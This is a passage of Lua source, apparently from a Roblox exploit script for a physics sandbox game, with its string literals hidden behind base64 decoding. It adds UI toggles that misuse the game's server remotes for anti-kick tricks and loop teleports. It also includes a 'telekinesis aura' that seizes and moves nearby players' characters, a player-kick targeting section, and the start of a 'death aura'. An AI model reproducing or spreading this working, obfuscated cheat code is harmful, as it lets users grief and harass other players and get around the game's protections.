            if SetToggleState then SetToggleState(loadstring(base64decode("QW50aUtpY2tJdGVtRmxhZw=="))(), Val) end
            AntiKickItemActive = Val 
            
            if Val then
                task.spawn(function()
                    local Item, SoundPart
                    while AntiKickItemActive and task.wait() do 
                        local char = plr.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local inPlot = plr:FindFirstChild(loadstring(base64decode("SW5QbG90"))())
                        local inv = workspace:FindFirstChild(plr.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        local destroyToy = RS:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))()) and RS.MenuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
                        
                        -- Safety Checks
                        if not hrp or not hum or hum.Health <= 0 or not inv then continue end  
                        if inPlot and inPlot.Value then continue end 
                        
                        -- Initiate PCLD Tracking if needed
                        if not MyPCLD and not pcldConn then
                            FindPCLD(hrp)
                        end

                        Item = inv:FindFirstChild(loadstring(base64decode("QW50aUtpY2tJdGVt"))()) 
                        SoundPart = Item and Item:FindFirstChild(loadstring(base64decode("SGl0Ym94"))())
                        
                        -- Spawning Logic
                        if not Item or not SoundPart then
                            for _,v in pairs(inv:GetChildren()) do 
                                if v.Name == loadstring(base64decode("QW50aUtpY2tJdGVt"))() then 
                                    pcall(function() destroyToy:FireServer(v) end)
                                end
                            end
                            
                            Item = SpawnToy(SelectedToy)
                            if not Item then continue end 
                            
                            SoundPart = Item and FWD(Item, loadstring(base64decode("SGl0Ym94"))(), 0.5)
                            if SoundPart then sno(SoundPart) end
                            
                            for _,v in pairs(Item:GetChildren()) do 
                                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then 
                                    v.CanCollide = false 
                                    v.Transparency = 0.8
                                    v.Color = Color3.fromRGB(0, 255, 255) -- Makes the item Cyan
                                end
                            end
                            
                            Item.Name = loadstring(base64decode("QW50aUtpY2tJdGVt"))()
                        end
                        
                        -- Ownership Maintenance
                        if SoundPart and not CheckNetworkOwnerOnPart(SoundPart) then 
                            sno(SoundPart)
                        end
                        
                        -- Server-Synced Movement Logic
                        local targetPart = MyPCLD or hrp:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))()) or hrp
                        if SoundPart and targetPart then
                            SoundPart.CFrame = targetPart.CFrame
                            SoundPart.AssemblyLinearVelocity = Vector3.zero
                            SoundPart.AssemblyAngularVelocity = Vector3.zero
                        end
                    end
                end)
            else
                -- Cleanup when toggled off
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                MyPCLD = nil
                
                task.spawn(function()
                    local inv = workspace:FindFirstChild(plr.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    local destroyToy = RS:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))()) and RS.MenuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
                    if inv and destroyToy then
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == loadstring(base64decode("QW50aUtpY2tJdGVt"))() then 
                                pcall(function() destroyToy:FireServer(v) end)
                            end
                        end
                    end
                end)
            end
        end
    })

    -- Watchdog to reset PCLD tracker when character dies/respawns
    plr.CharacterAdded:Connect(function(char)
        if AntiKickItemActive then
            MyPCLD = nil
            local hrp = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(), 5)
            if hrp then FindPCLD(hrp) end
        end
    end)
end

do
    DefenseExtra:CreateToggle({
    Name = loadstring(base64decode("QW50aSBLaWNrKFNodXJpa2VuKQ=="))(),
    Flag = loadstring(base64decode("U2h1cmlrZW5BbnRpS2ljaw=="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("U2h1cmlrZW5BbnRpS2ljaw=="))(), Value)
        _G.ShurikenAntiKick = Value
        
        local function ClearKunai()
            local inv = workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
            local destroyrem = RS:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))()) and RS.MenuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
            if inv and destroyrem then
                for _, v in pairs(inv:GetChildren()) do
                    if v.Name == loadstring(base64decode("QW50aUtpY2s="))() or v.Name == loadstring(base64decode("TmluamFTaHVyaWtlbg=="))() then
                        pcall(function() destroyrem:FireServer(v) end)
                    end
                end
            end
        end

        if Value then
            task.spawn(function()
                local setOwner = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
                local stickyEvent = RS:WaitForChild(loadstring(base64decode("UGxheWVyRXZlbnRz"))()):WaitForChild(loadstring(base64decode("U3RpY2t5UGFydEV2ZW50"))())
                local spawnRemote = RS:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
                local canSpawn = Player:WaitForChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))())

                local function getHRP()
                    if Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                        return Player.Character.HumanoidRootPart
                    else
                        return Player.CharacterAdded:Wait():WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    end
                end

                local function CheckForHome()
                    if not workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then return false end
                    for _, v in pairs(workspace.Plots:GetChildren()) do
                        local sign = v:FindFirstChild(loadstring(base64decode("UGxvdFNpZ24="))())
                        local owners = sign and sign:FindFirstChild(loadstring(base64decode("VGhpc1Bsb3RzT3duZXJz"))())
                        if owners then
                            for _, b in pairs(owners:GetChildren()) do
                                if b.Value == Player.Name then
                                    local folder = workspace.PlotItems:FindFirstChild(v.Name)
                                    if folder then return true, folder end
                                end
                            end
                        end
                    end
                    return false
                end

                local function StickKunai(kunai)
                    if not kunai or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) then return end
                    local currentHRP = getHRP()
                    if not currentHRP then return end
                    
                    if kunai:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))()) then
                        if not kunai.SoundPart:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) or kunai.SoundPart.PartOwner.Value ~= Player.Name then 
                            setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                        end
                    end
                    
                    local firePart = currentHRP:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))()) or currentHRP:WaitForChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))(), 5)
                    if firePart then
                        stickyEvent:FireServer(kunai.StickyPart, firePart, CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(90),math.rad(90)))
                    end
                    
                    for _, obj in pairs(kunai:GetChildren()) do
                        if obj.Name == loadstring(base64decode("UHlyYW1pZA=="))() then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                            if not obj:FindFirstChild(loadstring(base64decode("SGlnaGxpZ2h0"))()) then
                                local high = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))(), obj)
                                high.FillColor = Color3.fromRGB(0, 0, 0)
                            end
                        elseif obj.Name == loadstring(base64decode("TWFpbg=="))() then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                            if not obj:FindFirstChild(loadstring(base64decode("SGlnaGxpZ2h0"))()) then
                                local high = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))(), obj)
                                high.FillColor = Color3.fromRGB(255, 255, 255)
                            end
                        elseif obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 1
                        end
                    end
                end

                local function SpawnToy(name)
                    local t = tick()
                    while not canSpawn.Value do
                        if not _G.ShurikenAntiKick or tick() - t > 5 then return nil end
                        task.wait(0.1)
                    end
                    local currentHRP = getHRP()
                    if currentHRP then
                        task.spawn(function()
                            pcall(function()
                                spawnRemote:InvokeServer(name, currentHRP.CFrame * CFrame.new(0, 12, 20), Vector3.new(0,0,0))
                            end)
                        end)
                    end
                    local boolik, house = CheckForHome()
                    local inv = workspace:FindFirstChild(Player.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    if boolik and house then 
                        return house:WaitForChild(name, 2)
                    elseif not workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) and inv then 
                        return inv:WaitForChild(name, 2)
                    end
                    return nil
                end

                while _G.ShurikenAntiKick do 
                    task.wait(0.005)
                    if not Player.Character or not Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) or Player.Character.Humanoid.Health <= 0 then 
                        continue 
                    end
                    
                    local inv = workspace:FindFirstChild(Player.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    local kunai = inv and inv:FindFirstChild(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))())
                    
                    if workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then 
                        local boolik, house = CheckForHome()
                        if boolik and house and workspace.Plots:FindFirstChild(house.Name) then
                            local sign = workspace.Plots[house.Name]:FindFirstChild(loadstring(base64decode("UGxvdFNpZ24="))())
                            if sign and sign.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then 
                                kunai = SpawnToy(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))())
                                if kunai == nil then continue end
                                kunai.Name = loadstring(base64decode("QW50aUtpY2s="))() 
                                StickKunai(kunai)
                            end
                        end
                    end
                    
                    if not kunai then
                        if workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then continue end 
                        kunai = SpawnToy(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))())
                        if kunai == nil then continue end 
                        kunai.Name = loadstring(base64decode("QW50aUtpY2s="))()
                        if not kunai then continue end 
                    end
                    
                    repeat
                        if kunai and kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) and kunai.StickyPart.CanTouch == true then
                            StickKunai(kunai)
                            kunai.Name = loadstring(base64decode("QW50aUtpY2s="))()
                        end
                        task.wait(0.3)
                    until not kunai or not _G.ShurikenAntiKick or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) or kunai.StickyPart.CanTouch == false 
                        or not Player.Character or not Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) 
                        or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) 
                        or (Player.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20
                        
                    if not kunai or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) or not Player.Character or not Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or (Player.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then 
                        ClearKunai()
                    end 
                    
                    pcall(function()
                        repeat task.wait(0.05) until not _G.ShurikenAntiKick or not Player.Character or not Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) or not kunai or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) or not kunai.StickyPart:FindFirstChild(loadstring(base64decode("U3RpY2t5V2VsZA=="))()) or not kunai.StickyPart.StickyWeld.Part1
                        if not kunai or not kunai:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) or (Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) and Player.Character.Humanoid.Health <= 0) or not kunai[loadstring(base64decode("U3RpY2t5UGFydA=="))()]:FindFirstChild(loadstring(base64decode("U3RpY2t5V2VsZA=="))()).Part1 then 
                            ClearKunai()
                        end
                    end)
                end
                ClearKunai()
            end)
        else
            _G.ShurikenAntiKick = false
            ClearKunai()
        end
    end
})

Player.CharacterAdded:Connect(function()
    if _G.ShurikenAntiKick then
        task.wait(1)
    end
end)

-- AUTO-RESPAWN LOGIC: Re-runs the script loop when you die and respawn
plr.CharacterAdded:Connect(function()
    if _G.ShurikenAntiKick then
        task.wait(1) -- Wait for character to load properly
        -- The loop in the toggle will naturally pick up the new HRP
    end
end)

    do
        local pencilAntiKickActive = false
        local pencilAntiKickTask = nil
        local pencilRespawnConnection = nil

        local function spawnPencil()
            local spawnFolder = workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
            if not spawnFolder then return end
            
            local pencil = spawnFolder:FindFirstChild(loadstring(base64decode("VG9vbFBlbmNpbA=="))())
            if pencil then return pencil end
            
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                pcall(function()
                    game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        loadstring(base64decode("VG9vbFBlbmNpbA=="))(),
                        CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15),
                        Vector3.new(0, 0, 0)
                    )
                end)
            end
            return nil
        end

        local function fixPencil()
            pcall(function()
                local playerName = LocalPlayer.Name
                local spawnFolder = workspace:FindFirstChild(playerName .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                
                if not spawnFolder then return end
                
                local pencil = spawnFolder:FindFirstChild(loadstring(base64decode("VG9vbFBlbmNpbA=="))())
                
                if not pencil then
                    pencil = spawnPencil()
                    if not pencil then return end
                end
                
                local char = LocalPlayer.Character
                if not char then return end
                
                local torso = char:FindFirstChild(loadstring(base64decode("VG9yc28="))())
                local root = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if not (torso and root) then return end
                
                local stickyPart = pencil:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))())
                local soundPart = pencil:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                
                if stickyPart and stickyPart:FindFirstChild(loadstring(base64decode("U3RpY2t5V2VsZA=="))()) then
                    local weld = stickyPart.StickyWeld
                    
                    if weld.Part1 ~= torso then
                        local a = soundPart and soundPart.CFrame.Position or Vector3.zero
                        local b = root.CFrame.Position
                        local dist = (a - b).Magnitude
                        
                        if dist > 20 then
                            pcall(function()
                                game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).MenuToys.DestroyToy:FireServer(pencil)
                            end)
                        else
                            pcall(function()
                                game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).PlayerEvents.StickyPartEvent:FireServer(
                                    stickyPart,
                                    torso,
                                    CFrame.new(0, -1, 0) * CFrame.Angles(0, math.pi, 0)
                                )
                            end)
                            
                            for _, prt in pairs(pencil:GetChildren()) do
                                if prt:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                    prt.CanQuery = false
                                    prt.CanCollide = false
                                    prt.CanTouch = false
                                end
                            end
                        end
                    end
                end
            end)
        end

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("QW50aSBLaWNrIChQZW5jaWwp"))(),
            Default = false,
            Callback = function(Value)
                pencilAntiKickActive = Value
                
                if Value then
                    if pencilRespawnConnection then pencilRespawnConnection:Disconnect() end
                    pencilRespawnConnection = LocalPlayer.CharacterAdded:Connect(function()
                        task.wait(1)
                        if pencilAntiKickActive then
                            fixPencil()
                        end
                    end)
                    
                    pencilAntiKickTask = task.spawn(function()
                        while pencilAntiKickActive do
                            fixPencil()
                            task.wait(0.5)
                        end
                    end)
                else
                    pencilAntiKickActive = false
                    if pencilAntiKickTask then
                        task.cancel(pencilAntiKickTask)
                        pencilAntiKickTask = nil
                    end
                    if pencilRespawnConnection then
                        pencilRespawnConnection:Disconnect()
                        pencilRespawnConnection = nil
                    end
                    
                    local spawnFolder = workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    if spawnFolder then
                        local pencil = spawnFolder:FindFirstChild(loadstring(base64decode("VG9vbFBlbmNpbA=="))())
                        if pencil then
                            pcall(function()
                                game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).MenuToys.DestroyToy:FireServer(pencil)
                            end)
                        end
                    end
                end
            end
        })
    end
end

do

    -- Anti Blobman Kill
    do
        local ocnKakuConn = nil
        local ocnKakuAng = 0
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("QW50aSBCbG9ibWFuIEtpbGw="))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnKakuConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function(dt)
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if root then
                                ocnKakuAng = ocnKakuAng + dt * 9999
                                local rad = math.rad(ocnKakuAng)
                                root.CFrame = CFrame.new(math.cos(rad) * 50000, -100000, math.sin(rad) * 50000)
                            end
                        end)
                    end)
                else
                    if ocnKakuConn then
                        ocnKakuConn:Disconnect()
                        ocnKakuConn = nil
                    end
                    ocnKakuAng = 0
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Pos Lock
    do
        local ocnGroovConn = nil
        local ocnGroovPos = nil

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("UG9zIExvY2s="))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    pcall(function()
                        local c = LocalPlayer.Character
                        local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if root then
                            ocnGroovPos = root.CFrame
                        end
                        ocnGroovConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function()
                            local c2 = LocalPlayer.Character
                            local root2 = c2 and c2:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if root2 and ocnGroovPos then
                                local assembly = root2.AssemblyRootPart or root2
                                assembly.AssemblyLinearVelocity = Vector3.zero
                                assembly.AssemblyAngularVelocity = Vector3.zero
                                local offset = assembly.CFrame:ToObjectSpace(root2.CFrame)
                                assembly.CFrame = ocnGroovPos * offset:Inverse()
                            end
                        end)
                    end)
                else
                    if ocnGroovConn then
                        ocnGroovConn:Disconnect()
                        ocnGroovConn = nil
                    end
                    pcall(function()
                        local c2 = LocalPlayer.Character
                        local root2 = c2 and c2:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if root2 then
                            local assembly = root2.AssemblyRootPart or root2
                            assembly.AssemblyLinearVelocity = Vector3.zero
                            assembly.AssemblyAngularVelocity = Vector3.zero
                            if ocnGroovPos then
                                root2.CFrame = ocnGroovPos
                                ocnGroovPos = nil
                            end
                        end
                    end)
                end
            end
        })
    end

    -- Anti Loop Kill
    do
        local ocnStasisConn = nil
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("QW50aSBMb29wIEtpbGw="))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnStasisConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function()
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if root then
                                root.CFrame = CFrame.new(280, -4, 465)
                            end
                        end)
                    end)
                else
                    if ocnStasisConn then
                        ocnStasisConn:Disconnect()
                        ocnStasisConn = nil
                    end
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Loop TP (Op)
    do
        local ocnTornadoConn = nil
        local ocnTornadoAng = 0
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("TG9vcCBUUCAoT3Ap"))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnTornadoConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function(dt)
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if root then
                                ocnTornadoAng = ocnTornadoAng + dt * 50000
                                local rad = math.rad(ocnTornadoAng)
                                root.CFrame = CFrame.new(math.cos(rad) * 10000, 0, math.sin(rad) * 10000)
                            end
                        end)
                    end)
                else
                    if ocnTornadoConn then
                        ocnTornadoConn:Disconnect()
                        ocnTornadoConn = nil
                    end
                    ocnTornadoAng = 0
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Loop TP
    do
        local ocnManiacConn = nil
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = loadstring(base64decode("TG9vcCBUUA=="))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnManiacConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function()
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if root then
                                local ms = 2000
                                root.CFrame = CFrame.new(
                                    math.random(-ms, ms),
                                    math.random(-50, 500),
                                    math.random(-ms, ms)
                                )
                            end
                        end)
                    end)
                else
                    if ocnManiacConn then
                        ocnManiacConn:Disconnect()
                        ocnManiacConn = nil
                    end
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end
end

local PS = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local Player = PS.LocalPlayer

-- Variables to store state
local selectedKickPlayer = nil
local kickLoopEnabled = false
local kickLoopConnection = nil
local savedKickPos = nil
local currentKickTargetChar = nil

-- // Helper Functions \\ --

-- Formats the list as loadstring(base64decode("RGlzcGxheSBOYW1lIChAVXNlcm5hbWUp"))()
local function getPlayerList()
    local list = {}
    for _, plr in ipairs(PS:GetPlayers()) do
        if plr ~= Player then
            table.insert(list, plr.DisplayName .. loadstring(base64decode("IChA"))() .. plr.Name .. loadstring(base64decode("KQ=="))())
        end
    end
    return list
end

-- Extracts the username from the loadstring(base64decode("RGlzcGxheSBOYW1lIChAVXNlcm5hbWUp"))() string
local function getPlayerFromSelection(selection)
    if not selection or selection == loadstring(base64decode(""))() then return nil end
    local username = selection:match(loadstring(base64decode("QCguLSklKQ=="))())
    if username then
        return PS:FindFirstChild(username)
    end
    return nil
end

-- // UI Setup \\ --

-- Assuming 'Tabs' is defined in your main script setup
local TargetGroup = Tabs.Target:CreateBlock({Name = loadstring(base64decode("VGFyZ2V0IEludGVyYWN0aW9u"))(), Side = loadstring(base64decode("TGVmdA=="))()})
local ChooseGroup = Tabs.Target:CreateBlock({Name = loadstring(base64decode("Tm9uLUJsb2JtYW4gTWV0aG9kcw=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})
local BlobGroup = Tabs.Target:CreateBlock({Name = loadstring(base64decode("QmxvYm1hbiBLaWNr"))(), Side = loadstring(base64decode("UmlnaHQ="))()})
local TelekinesisGroup = Tabs.Grab:CreateBlock({Name = loadstring(base64decode("VGVsZWtpbmVzaXM="))(), Side = loadstring(base64decode("UmlnaHQ="))()})


local vu390 = {
    localPlayer = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer,
    Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))()),
    auraRadius = 25,
    SetNetworkOwner = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
}

local vu12 = { CurrentCamera = workspace.CurrentCamera }

vu390.localPlayer.CharacterAdded:Connect(function(p403)
    vu390.playerCharacter = p403
end)

local function startHellSendAura()
    vu390.gravityCoroutine = coroutine.create(function()
        while true do
            local v421, v422 = pcall(function()
                local v404 = vu390.localPlayer.Character
                if v404 and v404:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                    local v405 = v404.HumanoidRootPart
                    local v406 = vu12.CurrentCamera
                    for _, v410 in pairs(vu390.Players:GetPlayers()) do
                        if v410 ~= vu390.localPlayer and v410.Character then
                            local v411 = v410.Character
                            local v412 = v411:FindFirstChild(loadstring(base64decode("VG9yc28="))()) or v411:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))())
                            if v412 and (v412.Position - v405.Position).Magnitude <= vu390.auraRadius then
                                vu390.SetNetworkOwner:FireServer(v412, v405.CFrame)
                                for _, v416 in ipairs(v411:GetDescendants()) do
                                    if v416:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                        v416.CanCollide = false
                                    end
                                end
                                local v417 = v412:FindFirstChild(loadstring(base64decode("SGVsbEF1cmFQb3M="))()) or Instance.new(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                                v417.Name = loadstring(base64decode("SGVsbEF1cmFQb3M="))()
                                v417.MaxForce = Vector3.new(100000, 100000, 100000)
                                v417.D = 500
                                v417.P = 50000
                                v417.Parent = v412
                                local v418 = v412:FindFirstChild(loadstring(base64decode("SGVsbEF1cmFHeXJv"))()) or Instance.new(loadstring(base64decode("Qm9keUd5cm8="))())
                                v418.Name = loadstring(base64decode("SGVsbEF1cmFHeXJv"))()
                                v418.MaxTorque = Vector3.new(100000, 100000, 100000)
                                v418.D = 500
                                v418.P = 50000
                                v418.Parent = v412
                                local v419 = v406.CFrame.LookVector
                                local v420 = Vector3.new(0, 5, 0)
                                v417.Position = v405.Position + v419 * 15 + v420
                                v418.CFrame = CFrame.new(v412.Position, v405.Position)
                            end
                        end
                    end
                end
            end)
            if not v421 then
                warn(loadstring(base64decode("RXJyb3IgaW4gSGVsbCBTZW5kIEF1cmE6IA=="))() .. tostring(v422))
            end
            task.wait(0.05)
        end
    end)
    coroutine.resume(vu390.gravityCoroutine)
end

local function stopHellSendAura()
    if vu390.gravityCoroutine then
        coroutine.close(vu390.gravityCoroutine)
        vu390.gravityCoroutine = nil
    end
end

TelekinesisGroup:CreateToggle({
    Name = loadstring(base64decode("VGVsZWtpbmVzaXMgQXVyYQ=="))(),
        Flag = loadstring(base64decode("VGVsZWtpbmVzaXMgQXVyYQ=="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("VGVsZWtpbmVzaXMgQXVyYQ=="))(), Value)
        if Value then
            startHellSendAura()
        else
            stopHellSendAura()
        end
    end
})

local deathConnection = nil
local vu29 = { Death_Aura = false }
local vu6 = {
    SetNetworkOwner = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()),
    DestroyGrabLine = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
}

local function death(p424)
    if deathConnection then
        deathConnection:Disconnect()
        deathConnection = nil
    end
    if p424 then
        vu29.Death_Aura = true
        deathConnection = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
            for _, v429 in ipairs(game:GetService(loadstring(base64decode("UGxheWVycw=="))()):GetPlayers()) do
                if v429 ~= LocalPlayer and v429.Character then
                    local vu430 = v429.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    local vu431 = v429.Character:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
